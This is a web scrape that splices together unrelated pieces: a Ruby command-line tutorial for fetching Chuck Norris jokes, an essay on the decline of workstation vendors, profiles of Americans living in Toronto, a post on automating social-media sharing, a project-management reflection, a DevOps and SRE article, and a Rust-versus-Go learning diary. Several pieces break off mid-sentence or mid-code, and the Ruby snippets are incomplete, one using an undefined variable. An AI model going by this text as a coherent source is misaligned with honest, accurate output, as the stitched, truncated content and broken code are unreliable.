<div><pre><code><span>#!/usr/bin/env ruby</span>

<span>require</span> <span>'optparse'</span>

<span>options</span> <span>=</span> <span>{}</span>

<span>parser</span> <span>=</span> <span>OptionParser</span><span>.</span><span>new</span> <span>do</span> <span>|</span><span>parser</span><span>|</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-f"</span><span>,</span> <span>"--first-name FIRST_NAME"</span><span>,</span> <span>"Replacement for Chuck's first name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-l"</span><span>,</span> <span>"--last-name LAST_NAME"</span><span>,</span> <span>"Replacement for Chuck's last name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-r"</span><span>,</span> <span>"--random RANDOM_JOKES_COUNT"</span><span>,</span> <span>"Render n random jokes"</span><span>)</span>
<span>end</span>

<span>parser</span><span>.</span><span>parse!</span><span>(</span><span>into: </span><span>options</span><span>)</span>

<span>puts</span> <span>options</span><span>.</span><span>inspect</span>
</code></pre></div>
<p>and execute our command to see how arguments are parsed:</p>
<div><pre><code><span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>--</span><span>random</span> <span>4</span> <span>--</span><span>first</span><span>-</span><span>name</span> <span>John</span> <span>-</span><span>l</span> <span>Doe</span>
<span># =&gt; { random: 4, :'first-name' =&gt; 'John', :'last-name' =&gt; 'Doe' }</span>
</code></pre></div>
<p>The last step is to add support for the <code>--help</code> arugment:</p>
<div><pre><code><span>parser</span> <span>=</span> <span>OptionParser</span><span>.</span><span>new</span> <span>do</span> <span>|</span><span>parser</span><span>|</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-f"</span><span>,</span> <span>"--first-name FIRST_NAME"</span><span>,</span> <span>"Replacement for Chuck's first name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-l"</span><span>,</span> <span>"--last-name LAST_NAME"</span><span>,</span> <span>"Replacement for Chuck's last name"</span><span>)</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-r"</span><span>,</span> <span>"--random RANDOM_JOKES_COUNT"</span><span>,</span> <span>"Render n random jokes"</span><span>)</span>

  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-h"</span><span>,</span> <span>"--help"</span><span>,</span> <span>"Prints this help"</span><span>)</span> <span>do</span>
    <span>puts</span> <span>parser</span>
    <span>exit</span>
  <span>end</span>
<span>end</span>
</code></pre></div>
<p>The command will print a nice help output each time <code>-h</code> or <code>--help</code> argument will be passed:</p>
<div><pre><code>./bin/get_joke --help

# Usage: get_joke [options]
#    -f, --first-name FIRST_NAME      Replacement for Chuck's first name
#    -l, --last-name LAST_NAME        Replacement for Chuck's last name
#    -r, --random RANDOM_JOKES_COUNT  Render n random jokes
#    -h, --help                       Prints this help
</code></pre></div>
<p>The arguments parsing part is done, so we can now begin preparing the API URL to reflect the argument's values passed to our command.</p>
<p><strong>Preparing API URL with values passed as arguments</strong></p>
<p>As I mentioned before, we will use <code>http://api.icndb.com/jokes/random</code> endpoint, which provides the jokes about Chuck Norris. The following combination of the API URL is available:</p>
<ul>
<li>Multiple random jokes - <code>https://api.icndb.com/jokes/random/4</code> - it will provide four random jokes about Chuck Norris</li>
<li>Jokes with the replaced first name - <code>http://api.icndb.com/jokes/random?firstName=name</code> - the value from <code>firstName</code> will replace "Chuck" string in jokes</li>
<li>Jokes with replaced last name - <code>http://api.icndb.com/jokes/random?lastName=name</code> - the value from <code>lastName</code> param will replace "Norris" string in jokes</li>
</ul>
<p>The above variants can be combined to request five random jokes where Chuck Norris's name will be replaced with John Doe.</p>
<p>Here is the part of the code responsible for preparing the proper request URL:</p>
<div><pre><code><span>require</span> <span>'uri'</span>
<span>require</span> <span>'rack'</span>

<span>base_url</span> <span>=</span> <span>"http://api.icndb.com/jokes/random"</span>
<span>base_url</span> <span>+=</span> <span>"/</span><span>#{</span><span>options</span><span>.</span><span>fetch</span><span>(</span><span>:random</span><span>)</span><span>}</span><span>"</span> <span>if</span> <span>options</span><span>.</span><span>key?</span><span>(</span><span>:random</span><span>)</span>

<span>puts</span> <span>uri</span><span>.</span><span>to_s</span>
</code></pre></div>
<p>The part consists of two steps:</p>
<ol>
<li>Building the base URL - when the <code>random</code> argument is not passed, one random joke is returned by the default. When the argument is passed, we add it to the end of the path</li>
<li>Building query - we build a simple query and reject params where the value is not given. With a little help of <code>Rack::Utils</code> class, we created a query part of the URL</li>
</ol>
<p>We can test it to see how it's working:</p>
<div><pre><code><span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span>
<span># =&gt; http://api.icndb.com/jokes/random</span>

<span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>-</span><span>r</span> <span>4</span>
<span># =&gt; http://api.icndb.com/jokes/random/4</span>

<span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>--</span><span>random</span> <span>4</span> <span>--</span><span>first</span><span>-</span><span>name</span> <span>John</span> <span>-</span><span>l</span> <span>Doe</span>
<span># =&gt; http://api.icndb.com/jokes/random/4?firstName=John&amp;lastName=Doe</span>
</code></pre></div>
<p>The second part is done so we can perform the request to the API and parse the response to render jokes in the console.</p>
<p><strong>Parsing API response and rendering jokes</strong></p>
<p>The goal is to use only code that is available out of the box in Ruby, so to perform the request, we will use the <code>Net::HTTP</code> class and <code>get_response</code> method. The response is in <code>JSON</code> format, so we have to parse it before doing anything else:</p>
<div><pre><code><span>require</span> <span>'net/http'</span>
<span>require</span> <span>'json'</span>

<span>response</span> <span>=</span> <span>Net</span><span>::</span><span>HTTP</span><span>.</span><span>get_response</span><span>(</span><span>uri</span><span>).</span><span>body</span>
<span>parsed_response</span> <span>=</span> <span>JSON</span><span>.</span><span>load</span><span>(</span><span>response</span><span>)</span>
</code></pre></div>
<p>If the <code>type</code> attribute from the response equals <code>success</code>, we can render jokes. Otherwise, something went wrong, and it won't be funny. We should have in mind that the format of the response is different depending on the number of jokes we request.</p>
<p>When one joke is requested, the joke is available as a hash. When multiple jokes are requested, the response contains an array of jokes:</p>
<div><pre><code><span>require</span> <span>'net/http'</span>
<span>require</span> <span>'json'</span>

<span>response</span> <span>=</span> <span>Net</span><span>::</span><span>HTTP</span><span>.</span><span>get_response</span><span>(</span><span>uri</span><span>).</span><span>body</span>
<span>parsed_response</span> <span>=</span> <span>JSON</span><span>.</span><span>load</span><span>(</span><span>response</span><span>)</span>

<span>if</span> <span>parsed_response</span><span>[</span><span>'type'</span><span>]</span> <span>==</span> <span>'success'</span>
  <span>value</span> <span>=</span> <span>parsed_response</span><span>[</span><span>'value'</span><span>]</span>
  <span>value</span> <span>=</span> <span>[</span><span>value</span><span>]</span> <span>if</span> <span>value</span><span>.</span><span>is_a?</span><span>(</span><span>Hash</span><span>)</span>

  <span>value</span><span>.</span><span>each_with_index</span> <span>do</span> <span>|</span><span>joke</span><span>,</span> <span>index</span><span>|</span>

<span>else</span>
  <span>puts</span> <span>'Something went wrong, please try again'</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>Last month’s news that <a href="https://arstechnica.com/information-technology/2020/10/ibm-to-split-into-two-companies-by-the-end-of-2021/">IBM would do a Hewlett-Packard</a> and divide into two—an IT consultancy and a buzzword compliance unit—marks the end of “business as usual” for yet another of the great workstation companies.</p>
<p>A quick aside on computing history. You can imagine personal computing being driven by two distinct schools of thought. The “top down” school, represented by research-led organisations including Xerox PARC, Bell Labs,academia and the military, asked “what would the world be like if everyone had their own minicomputer”? They took large, time-sharing systems like UNIX and installed them first under, then on, employees’ desks for their own personal use.</p>
<p>The “bottom up” school was made up of hobbyists who asked “can we make an interesting computer out of inexpensive components”? Thus companies like Apple and MITS in the US, Acorn and Sinclair Radionics in the UK, and others took chips that were usually used as peripherals controllers in “real” computers and built interactive programming systems around them. The microcomputer revolution came from the bottom-up school, as they made home computing affordable. The workstation revolution came from the top-down school, as they made powerful on-demand computing feasible.</p>
<p>The two schools came into very close proximity in the 1980s, when the Motorola 68000 family of CPUs (along with the 68881/68882 FPU and 68851 MMU) were the processors of choice in everything from entry-level PCs like the Atari 520ST, through games consoles like the Sega Mega Drive (Genesis in the US), to the most expensive UNIX workstations from NeXT Computer, Sun Microsystems, and Apollo Computer.</p>
<p>But then the workstation makers invested heavily in their own CPU architectures based on RISC design principles and again the two diverged. The workstation market became highly differentiated: RS/6000 from IBM (later PowerPC), Alpha from Digital Equipment Corp, MIPS from, well, MIPS, SPARC from Sun, PA-RISC from HP. The software on these workstations, while superficially very similar, was also differentiated and surprisingly incompatible. Take a program from HP-UX and you’ll have difficulty running it on NeXTSTEP, unless the authors shared the source code and used the nascent GNU autotools to support portable building. As Yoda said: begun, the <a href="https://www.livinginternet.com/i/iw_unix_war.htm">UNIX wars</a> have.</p>
<p>Of course we know that the (desktop) computing world today is mostly Intel and that workstations are mostly fancy PCs, rather than bespoke designs by vertically-integrated companies, Apple being the two trillion dollar outlier. How we got here was that the commodity parts got good enough that there was no evident advantage to workstation-grade hardware. A high-end PC could easily run a workstation OS like System V UNIX (Solaris was an early example), BSD (386BSD which later became FreeBSD, or NeXTSTEP) or Windows NT.</p>
<p>Along the way, the workstation companies consolidated (Apollo and eventually DEC got absorbed into HP; MIPS into SGI) or disappeared altogether (Sun became Oracle Hardware; SGI went bankrupt and sold its assets to sgi; Symbolics did similar—incidentally Symbolics was the first company with a .com domain). IBM long ago stopped even making its own brand PCs, and the news of its split means that there are now very few workstation companies trading in the same form they had “back in the day”. The only ones I can think of that have not had major changes to their corporate structures are Xerox and Sony, whose management may not even have known that they sold workstations.</p>
<p>What’s got lost alongside the death of the workstation is the business model where you sell expensive computers as part of an integrated solution into a particular vertical market, where that expensive solution will cost a lot less than cobbling something together out of cheap PCs. Why? I think people have a lower expectation and higher pain threshold when using computers now; they expect an amount of friction based on their own experience and translate that expectation into realms where it doesn’t belong. As I described way back in issue 2, <a href="https://deprogrammaticaipsum.com/the-various-meanings-of-quality/" target="_blank" rel="noopener noreferrer">computing is a lemon market</a>.</p>
<p>Organisations would go to the workstation vendors because they solved particular problems very well. If you’re in AI, you need Symbolics. Computer graphics, SGI. Telecoms, that’d be Sun. If you want to write software in Ada for the military-industrial complex, you’ll be buying a Rational workstation. Yes, the first IDE was a completely integrated package of hardware and software. And, of course, Apple for Desktop Publishing, the Mac being a workstation of sorts itself. People would buy computers <em>because</em> applications like AutoCAD, Quark or Mathematica ran well on them. They wouldn’t buy the computer then browse the App Store to see whether it could do anything useful.</p>
<p>And the strange thing is that catering to those vertical markets with integrated solutions is easier than ever now. The wide availability of free software means that the basic job of “being a desktop computer” is taken care of at zero cost, so business can focus on contributing valuable bespoke behaviour. And hardware costs are lower than ever: the availability of high-capability SoCs and single-board computers like the Raspberry Pi and Rock64 should make it a no-brainer to sell the computers as accessories for the applications, not the other way around.</p>
<p>In high-tech domains, an engineer could readily have a toolchest of suitable computers in the same way that a mechanic has different tools for their tasks. This one has an FPGA connected by both PCI-E and JTAG to allow for quick hardware prototyping. This one is connected to a high-throughput GPU for visualisations; that one to a high-capacity GPU for scientific simulations.</p>
<p>The general purpose hardware vendors want us to believe that an okay-at-anything computer is the best for everything: you don’t need a truck, so here’s a car. But when you’re hauling a ton of goods, you’ll find it cheaper and more satisfying to shell out more for a truck. Okay-at-anything is good for nothing.</p>

(This is such ancient history that, in the late 1980s, campus announcers had board operators. Also: The Tigers were still good enough to give people a reason to wear their cap). Once, over a discussion of baseball, John told me he loved the game, but hated watching it.</p><p>“On television?” I asked. “It’s true that some find it very slow.”</p><p>“No, television’s fine,” he said. “It’s the games I find troubling. Actually, it’s the time before the game that’s most troubling.”</p><p>I found this perplexing until he told me why he was troubled: John refused to stand for “The Star-Spangled Banner.”</p><p>“I left the States during Vietnam,” he said. “I won’t honour the anthem. It makes me angry every time I hear it.”</p><p>“What do people think?” I asked him. “What do people think when you don’t stand?”</p><p>“Most of them look at me like there’s something wrong with me physically. But then I get up for ‘O Canada.’ Most people don’t say anything,” he said. “But, every now and then...,” he added, leaving the thought unfinished.</p><p>I’ve been thinking about John’s story now, as I’ve watched the protest movement across professional sports, sparked by another man, Colin Kaepernick, who wouldn’t stand either. And I started to recognize the Americans among us. Back in the ’80s, the lion’s share of Americans in Canada had come over the border into Ontario as objectors to the Vietnam War. In 2020, it’s a different demographic, and we wondered what motivated them to come. Following Trump’s inauguration, American emigration surged and has stayed high throughout his term. With the American election approaching, we reached into the West End, and across the city, to tell stories of how the Americans ended up here and why, and how they feel as their country lurches at the crossroads.</p><p>—DAVE BIDINI</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_32146"><div><h2><a href="https://www.westendphoenix.com/americans/maureen-honore">Maureen Honore</a></h2><h3>“We don’t talk much about the future because we can’t; we need to survive right now”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_60277"><div><h2><a href="https://www.westendphoenix.com/americans/tyler-clark-burke">Tyler Clark Burke</a></h2><h3>“I still seem to connect immediately with other Americans whenever we find each other in a crowd”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_69739"><div><h2><a href="https://www.westendphoenix.com/americans/richard-berman">Richard Berman</a></h2><h3>“I remember with absolute clarity the instant when I realized that this was the place for me”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_90784"><div><h2><a href="https://www.westendphoenix.com/americans/bill-king">Bill King</a></h2><h3>“We packed up and hitchhiked to Canada”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_127695"><div><h2><a href="https://www.westendphoenix.com/americans/valerie-hunter">Valerie Hunter</a></h2><h3>“We seem to end up nervously sighing and shaking our heads without verbalizing our collective sense of dread”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_165349"><div><h2><a href="https://www.westendphoenix.com/americans/brad-wheeler">Brad Wheeler</a></h2><h3>“The cheeseburger and the banquet-cut fries tasted exactly as I remembered them”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_175780"><div><h2><a href="https://www.westendphoenix.com/americans/tim-ellis">Tim Ellis</a></h2><h3>“I left the military, got into raving and became a DJ”</h3></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604018078061_185261"><div><h2><a href="https://www.westendphoenix.com/americans/jessica-todd-long">Jessica Todd Long</a></h2><h3>“Even if he wins and Trump leaves peacefully, the country is very divided.

    <p>In a quest to spend more time writing and less time sharing online what I write, I developed an automated workflow to share my posts on social media with minimal effort.</p>
<p>What used to take me up to ninety minutes per week happens now automatically.</p>
<p>I can focus on sketching and writing while the machine takes care of formerly-manual labor.</p>
<hr>
<p>I sketch and write daily, pairing up my sketches and essays as little stories. I have to manually scan and edit my drawings, as well as polish my writing drafts and translate them into Spanish. I then upload the sketch and story to my website and schedule them for publication.</p>
<p>On the publication date, a series of automated events take place.</p>
<p>Let's see what those are.</p>
<hr>
<p>First, the story shows up on my RSS feed — a standardized system to distribute content online so users and applications can receive updates — which contains all my publications. The story also appears on the main page of my website, at&nbsp;<a target="_blank" href="http://nono.ma/">Nono.MA</a>, and on my sketches page,&nbsp;<a target="_blank" href="https://sketch.nono.ma/">Sketch.Nono.MA</a>.</p>
<p>In the early morning of the scheduled date, a Mailchimp newsletter campaign reads my RSS feed and sends the Spanish version via email to Spanish subscribers. Later that day, early morning in the United States, another newsletter campaign emails the original English story. (The one you're reading now.)</p>
<p>The same feed is read by Zapier, an online service I've configured to share my weekly sketch and story on multiple social media accounts, including Facebook, Twitter, Tumblr, LinkedIn, and Instagram.</p>
<p>The post is shared on two Facebook pages, two Twitter accounts, two Instagram accounts, one Tumblr account, and my personal LinkedIn profile, and scheduled to be re-shared on Twitter on Friday, two weeks later, using Buffer. An image-processing and optimization service called Imgix resizes my sketch's canvas to be shared as a square image on Instagram.</p>
<p>Two optional manual steps make this process feel a bit more human: sharing on Hacker News, something I might not want to do every week, and sharing on my Facebook timeline. (Neither Hacker News nor Facebook's API let you automate this step.)</p>
<hr>
<p>Sharing each story used to steal ten to ninety minutes of my time.</p>
<p>Now my job is to supervise the pipeline works and make little adjustments here and there.</p>
<p>I can focus on sketching and writing.</p>

                Published on <em>November 3rd, 2020</em>
                By <em>zooboole </em>
                        </p>
          
          
              <div>
                  <p>How many times you've said to yourself "we cannot implement this or that feature"?. Or "there is no need to use this or that" or asked yourself if it was possible to achieve a project or part of it?</p>

<p>At a given point our limitations or/and our skills influence how we handle projects. It's always a present phenomenon that is, in most cases, neglected and mistaken.</p>

<p>Developers and designers will tend to only approve or support ideas that they know they can handle. The project manager will push the team to their nightmare zones. Then the project owner might go further or fold to a little possibility because he/she has no idea that those things can be achieved or even exist.</p>

<p>Knowing a technology means also knowing its limitations, you will tend to instinctively avoid or reject to implement certain ideas or solutions. It happens naturally. Sometimes it interprets as a self-satisfactory stage. You just feel it as in <em>I think it's OK</em>. Yes, I know we should avoid falling into the <a href="https://phpocean.com/blog/article/the-designer-s-fever-of-beautification-and-its-traps/63">loop of perfection</a>. But it's crucial for advancement. from time to time we must ask ourselves if that's the only limit.</p>

<p>So, someone with fewer skills in tech would be pushed to think of only expected results without thinking of the pain poured on the technicians. They would see it as I just want it like this and that. Not knowing how things are done gives them the courage and peace of mind to express themselves to the extreme. Hence, they will usually have that feeling of dissatisfaction. Or, the fact that they have less knowledge about it will turn them speechless. That leaves room for the technicians to suggest to them what can be done or not. And that could have an opposite impact which is to do what the technicians see and not what the project owner sees.</p>

<p>In all cases, these behaviors affect how we undertake projects. My goal in this post is to call your attention to such psycho-antagonism in teams. Get the habit to check where you and others stand. Then throw the pride and shame away to admit to what is necessary and viable for the project's success.</p>

  <p><strong>Whatever happens always happens on time.</strong> <br> <em>Zen quote about software delivery</em>
<img src="https://rastko.tech/images/two-scales-00.jpg"></p>
</blockquote>

<p><br>
This article is a continuation of the discussion about NFRs of being <a href="https://rastko.tech/blueprints/cloud/cloud-native/kubernetes/infrastructure/architecture/solutions/2020/10/22/native-to-cloud.html">Native to the Cloud</a></p>

<h2 id="the-scale-of-things-to-come">The scale of things to come</h2>

<p>The set of complexities that you have to manage in your system, from its inception to the end of days, is immense. It represents a summary of its architecture, the way it is built, a structure that creates and delivers it, and the structure that is being serviced by it.</p>

<blockquote>
  <p><strong>I want to be fully focused on non-functional requirements in this article, so the “the way it is built” part will be avoided, we are currently not interested in software itself, just surrounding stuff - the footprint of its life.</strong></p>
</blockquote>

<p><strong>The architecture</strong> of the system defines the end-to-end structure of the system, the layout of components, and their correlation. It defines events and data flows and makes the footprint in the infrastructure. This is the part that gets deployed to Kubernetes and other connected systems.</p>

<p><img alt="microservice architecture deployed to kubernetes and coud with cdn elements databases etc" src="https://rastko.tech/images/two-scales-0.jpg"></p>

<p><strong>In the picture -</strong> Microservice architecture with event-driven components and two UIs, which would be considered medium complexity projects at the start. The central piece is handled by Kubernetes while there are few mounted components from cloud solutions and CDN to handle static content (UI) and caching.</p>

<blockquote>
  <p>I intend to analyze most of the complexities of setting up and running the above and similar systems through a series of articles I am writing on the topic of non-functional requirements (NFR). I want to give more concrete approaches and more clarity on the implications of every approach and decision in this space. To make things easier, I will probably make some choices, like <strong>the choice to do everything in the Kubernetes space</strong>.</p>
</blockquote>

<h3 id="fluidity">Fluidity</h3>

<p>Further on, I would like you to understand that your system will, in most cases, have to handle the fluid nature of software architecture: you have to be ready for ever-changing software design (emergent design). And there we get to the actual problem space.</p>

<blockquote>
  <p><strong>Emergent design-</strong> The idea is that the design of the system emerges (and changes) little by little, in small increments - in the same way, I hope your development process is organized.</p>
</blockquote>

<p>Effects of emergent design manifest on all aspects of your software’s development, delivery, and lifecycle. This is continuously changing NFR problem space, which consequentially requires you to continuously adapt your solution. The actual problem we are solving is represented by twofold complexity you are bound to manage till the end of the day. These two parts of the problem are best analyzed and tackled together, through one thought process.</p>

<p>Over a period of many years I have spent working on all the aspects of software, I ended up calling this <strong>“the two scales of devops”.</strong> Of course, scales are complexity and volume measurements of particular software aspects:</p>

<ul>
  <li><strong>The development and delivery</strong> - the scale of development.</li>
  <li><strong>The production part</strong> - the scale of life.</li>
</ul>

<p>This <strong>problem of two scales</strong>, as I would usually call it, has to be solved day in and day out, which means that, in our case, it becomes a <strong>paradigm - we want to discuss and collect some established patterns for solving its usual components</strong>.</p>

<h3 id="the-first-scale">The first scale</h3>

<p>The scale of development is about providing a good development experience at any pace, about development tooling, about flow efficiency, security, and ease of onboarding. You measure the quality of the solution in this area through build times, lead times to production, testing capabilities, release confidence, employee satisfaction (eNPS?), security, and process transparency metrics.</p>

<blockquote>
  <p><strong>Flow efficiency -</strong> every workflow is composed of periods of problem-solving focused work and everything else (less important work and wait periods), the efficiency of the flow is the coefficient that shows what percentage of all the time you spend in the flow is actual problem-solving work.</p>
</blockquote>

<p>At this side of the equation, structure and method of delivery is the central point of the solution, the focus is mostly not on tools (apart from Kubernetes and few chosen specifics just for this analysis to even be possible), but on a way to utilize set of tools you chose to best manage any development process.</p>

<blockquote>
  <p>One of the key points of any analysis like this is actually leaving the solution open-ended to enable the development team to accommodate for new use cases.</p>
</blockquote>

<p><img alt="system for delivering microservice architecture to production" src="https://rastko.tech/images/two-scales-1.jpg">
<strong>In the picture -</strong> Developing and delivering a system with certainty and high quality is quite a complex set of tasks and problems on its own.</p>

<p>Creating fast and resilient tooling to deliver your application smoothly, and allow flexibility to set up a good process around it is the key. It is about technically enabling your engineering team and setting the whole team up for success.</p>

<blockquote>
  <p><strong>KPIs</strong> - ultimately, our solutions on this side would be measured by three main metrics:</p>
  <ul>
    <li>Lead Time for a change - mostly relaying on flow efficiency (less approvals needed, less process bottlenecks of other kinds) and technical characteristics of a build process (faster builds, faster quality checks…)</li>
    <li>Change failure rate - relying on QA and SRE, mostly backed by Defect Detection Percentage (DDP) that makes sure to detect as many as possible quality issues before code hits production, and MttR (Minimum time to Resolve) that makes sure that we can notice problems in prod earlier and solve them using various automatic or one-touch recovery tools.</li>
    <li>Deployment frequency - relying on quality and flexibility of the process and technical solutions with focus to make changes smaller and more frequent.</li>
  </ul>
</blockquote>

<blockquote>
  <p>Good further read on this topic is <a href="https://itrevolution.com/book/accelerate/">Accelerate</a>, the book which explains the approaches around building annual State of DevOps report.</p>
</blockquote>

<h3 id="the-second-scale">The second scale</h3>

<p>This side of your system takes the software over after it is delivered to production, it is the area where the long term stability of the app is defined. It is about a long term perspective of running it in production.</p>

<p>The scale of life is focused on operation, stability (resilience), security, and capacity planning. You measure the quality in this area through SLOs, API contract tests, quality of service, and incident response metrix (MttX).</p>

<blockquote>
  <p>This scale is about serving the end-user with a high-quality product, it is about the business value we are delivering and how to serve it in the best way.</p>
</blockquote>

<p>Deeper down it is all about operational tooling, telemetry, good capacity planning, and other more specific SRE approaches.</p>

<h2 id="the-devops-and-sre">The DevOps and SRE</h2>

<blockquote>
  <p><strong>KPIs and signals</strong> - KPIs (key performance indicators) of your service can be observed through two lenses:</p>
  <ul>
    <li>Operational - how good capabilities and people are working together, which is measured through Minimum time to Detect, Diagnose and Resolve a problem (MttX where X can be D for detect, R for resolve and many more based on what you want to measure). Signals to measure here are partly communicational - how automated the system is and how close are the teams involved, and partly in following category.</li>
    <li>Application - Quality on Service level, which is measured through service level objectives (how we want it to perform), indicators (what system metrics we use to determine this performance) and agreements /contract that we make with our clients in regards to how our app should perform (SLX). Signals we observe and combine in these case are also known as <strong>four golden signals - error rate, latency, traffic and saturation.</strong></li>
  </ul>
</blockquote>

<p>In order to efficiently handle the problem space we just defined, the team has to be able and empowered to fully own everything they are building. The team should also own the process, and sometimes the team itself. Depending on the size of the scope, the team, and the company, it might not be the same team owning the whole thing end to end, it might be a couple of teams working together in certain, hopefully, efficient collaboration.</p>

<p>This approach of high ownership is better known as DevOps, the concept aiming to blur the boundaries between software development, delivery, and operation, bringing it closer together, with the goal to make software development and delivery a lot more efficient and high quality.</p>

<blockquote>
  <p><strong>SRE -</strong> site reliability engineering is a set of software engineering practices focused on infrastructure reliability and operations. It is born from the direct application of DevOps methodologies on live systems with a heavy focus on automation and observability. SRE focused teams usually split their focus roughly 50-50 between software engineering (building tools, features, or automation), and operations/support tasks (like incident handling, on-call, and so on).</p>
</blockquote>

<blockquote>
  <p>Good further read on this topic and many other topics that I write about can be found in the <a href="https://landing.google.com/sre/sre-book/toc/">SRE book</a></p>
</blockquote>

<h3 id="to-tame-the-scales">To tame the scales</h3>

<p>Goal of delivering high-quality software as soon as possible represents both scales. It puts focus on smooth delivery of your software and making sure it is reliable (high quality). <strong>Taking DevOps concepts and more closely applying them to live systems belongs to the site reliability engineering (the SRE)</strong>.</p>

<p>Systems that are native to the cloud are able to adopt DevOps approaches faster than others through building tools and capabilities (like on-demand infrastructure for engineers, fast and safe releases, security-first design…).</p>

<p>If built correctly, these systems often have the right tool for …</p></div></div>

In case you want to hit it from the start, <a href="https://levpaul.com/posts/rust-lesson-1/">here’s</a> a link to the first one! This entire series covers my journey from being a completely land-locked Gopher to becoming (hopefully) a hardened Rustacean, able to skitter the hazardous seabed of any application safely.</p><h4 id="how-rust-is-makin-me-feel">How Rust is Makin' Me Feel</h4><p>Let me begin not by thwacking loosely about in concepts I know little yet of, as there’s plenty of time for that, but instead allow me to paint the landscapes I see for both Rust and Go. At quite the visceral it occurred to me that these modern languages are built not just to make our coding lives more delightful - but instead to shepherd us into particular engineering and organizational goals.</p><p>The needs for new general purpose languages no longer stem from the “simple” software problems. Take the problems of using variables (Assembly), using custom data types (C), cross-platform, cross-architecture compatibility (JVM languages) or even being dead simple (Python). Today’s languages can instead choose features from all the preceding and <em>then</em> apply engineering and organizational direction.</p><h4 id="the-coercion-of-go">The Coercion of Go</h4><p>I’ve been writing in Go as a hobby since 2014 but professionally only since 2018. As a hobbyist I’ll admit I used to think “Go is <em>opinionated</em>”. That seemed cool, because opinions mean something! Right? But <em>why</em> was it opinionated Levi, WHY? WAKE UP MAN!</p><p>Well today I have a completely different look on it. Go is simply a language that is very <em>safe</em> to share across engineers. This is because engineers don’t need to make a lot of decisions when they use Go. If an application has had its design completed in theory then in Go it often really is just a matter of whacking out the code to make it a reality.</p><p>Just look at how much of Go’s development tooling Google owns. With Java, I remember choosing between Ant or Maven for your build tooling. Go doesn’t let you chose. The closest we got to having a choice was with <code>dep</code> for dependency management. But finally Google caved and <code>gomod</code> was brought about as the standard. Go does its best to take choices away from you. You don’t need to chose between Tomcat or Jetty - the Go <code>net/http</code> package will handle 10kRPS for you no problem. Hell I’ve looked at apps serving 50kRPS, whilst <em>logging</em> a third of said requests simply using <code>fmt.Println</code>. You just don’t need to stray far from the standard library to scale and that is a huge plus of the language. (A large part of this is also comes from the fact that webservers haven’t changed a heck of a lot in the past 10 years so Go didn’t have to “keep up” - on the other hand my experience with http2 in Go has been far from ideal).</p><h5 id="_anyone_-can-pick-up-your-code-and-fix-it"><em>Anyone</em> can pick up your code and fix it</h5><p>This is by far the biggest selling point of using Go <em>in a company</em>. If you need to hire help you can find basically <em>anyone</em> with backend experience, and they will pick up 90% of Go in a week or two. You don’t need to worry at all if they have experience with Struts, JUnit or Spring - what’s in the standard library is plenty. I mean it. Do they need to know about passing pointers or values? Not really - general software engineering practices like peer review and simple unit testing will uncover those types of issues with ease.</p><p>Now on the other hand - who in their right mind would hire <em>me</em> to join their Rust team right now? Nobody - because I would be a gigantic liability to that team.</p><h5 id="gos-purpose-is-for-dev-shops-to-crank-out-web-services-that-are-scalable-easy-to-develop-and-do-not-require-mission-critical-performance">Go’s purpose is for dev shops to crank out web services that are scalable, easy to develop and do not require mission critical performance.</h5><h4 id="rust-no-rust">Rust no Rust</h4><p>I’m a noob. 100%. But even so, in my feeble mind I can already see what Rust is. I see a very sharp knife; but this knife is completely and utterly shrouded and encased in tamper-proof, child-proof, thief-proof hardened and sealed plastic shells. Yes shells as in the plural of shell. These shells are even adult-proof too, where the adult is a generic engineer trained generally in other languages only. The compiler is the packaging, and it will let you wield the knife when it knows exactly what your action plan is. -But oh no, not just any plan will do, your plan <em>must</em> adhere to each and every rule and regulation from the Knife Safety Measurement Act of 1938 and its associated amendments!! (This may not be strictly true as I’ve heard about an <code>unsafe</code> keyword).</p><p><em>But why so much plastic broseidon?</em> You know, and I know that it’s to keep mild-minded people like myself exactly, from nicking fingers with that very sharp knife. Warping back to a meta-level, those fingers don’t even necessarily belong to me the coder, but to the end users of the code. It is no secret to anybody even slightly interested in Rust that a major driving factor for the language was to be able to replace C++ code with something <em>as</em> efficient but much less susceptible to security exploits. Thus, the safety plastic aims not to protect individual coders, but the <em>coding organization</em>.</p><p>Okay, you’ve probably heard enough of my opinion, let’s move on before this analogy implodes and actually hurts someone.</p><hr><h2 id="give-me-the-lessons">Give Me The Lessons!</h2><h4 id="3-common-programming-conceptshttpsdocrust-langorgbookch03-00-common-programming-conceptshtml">3. <a href="https://doc.rust-lang.org/book/ch03-00-common-programming-concepts.html">Common Programming Concepts</a></h4><p>One of the first ‘huh’ moments in this lesson was this compiler message:</p><div><pre><code data-lang="rust"><span>compiler</span><span> </span><span>error</span>:
<span>For</span><span> </span><span>more</span><span> </span><span>information</span><span> </span><span>about</span><span> </span><span>this</span><span> </span><span>error</span><span>,</span><span> </span><span>try</span><span> </span><span>`</span><span>rustc</span><span> </span><span>--</span><span>explain</span><span> </span><span>E0384</span><span>`</span><span>.</span><span>
</span></code></pre></div><p>Naturally I ran the command listed, which took me to a <code>less</code> window (buffer?) containing the following:</p><div><pre><code data-lang="fallback">An immutable variable was reassigned.
Erroneous code example:
'''
fn main() {
    let x = 3;
    x = 5; // error, reassignment of immutable variable
}
'''
By default, variables in Rust are immutable. To fix this error, add the keyword
`mut` after the keyword `let` when declaring the variable. For example:
'''
fn main() {
    let mut x = 3;
    x = 5;
}
